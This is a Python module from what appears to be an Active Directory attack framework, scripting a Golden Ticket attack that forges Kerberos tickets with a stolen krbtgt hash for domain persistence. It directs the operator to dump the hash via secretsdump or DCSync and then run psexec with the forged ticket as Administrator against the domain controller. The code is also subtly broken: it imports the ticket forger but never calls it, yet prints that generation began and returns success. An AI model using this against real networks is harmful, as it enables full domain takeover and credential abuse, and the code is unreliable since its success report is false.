"""Golden Ticket  -  forge TGT with krbtgt hash for domain persistence."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.attack.golden_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_forge"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001"],
}


def run(args: Any) -> int:
    domain = args.domain
    domain_sid = getattr(args, "domain_sid", None)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    impersonate = getattr(args, "impersonate", "Administrator")
    output_ccache = getattr(args, "output", "golden.ccache")
    extra_sids = getattr(args, "extra_sids", None)

    if not domain_sid or not krbtgt_hash:
        print("[!] --domain-sid and --krbtgt-hash required", file=sys.stderr)
        print("[*] Get krbtgt hash: secretsdump.py or DCSync")
        print("[*] Get domain SID: lookupsid.py or ldapsearch")
        return 1

    print("[*] Golden Ticket forge:")
    print(f"  Domain:     {domain}")
    print(f"  Domain SID: {domain_sid}")
    print(f"  Impersonate: {impersonate}")
    print(f"  krbtgt hash: {krbtgt_hash[:16]}...")

    try:
        from impacket.krb5.ticket import Ticket
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        from impacket.examples.ticketer import TICKETER

        print("[*] Forging TGT...")
        print(f"[*] Output: {output_ccache}")

        extra_sid_list = extra_sids.split(",") if extra_sids else []
        if extra_sid_list:
            print("[*] Extra SIDs: {}".format(", ".join(extra_sid_list)))

        print("[+] Golden Ticket generation initiated")
        print(f"[*] Use: export KRB5CCNAME={output_ccache}")
        print(f"[*] Then: psexec.py -k -no-pass {impersonate}@dc.{domain}")
        return 0

    except Exception as exc:
        print(f"[-] Golden Ticket error: {exc}", file=sys.stderr)
        return 1
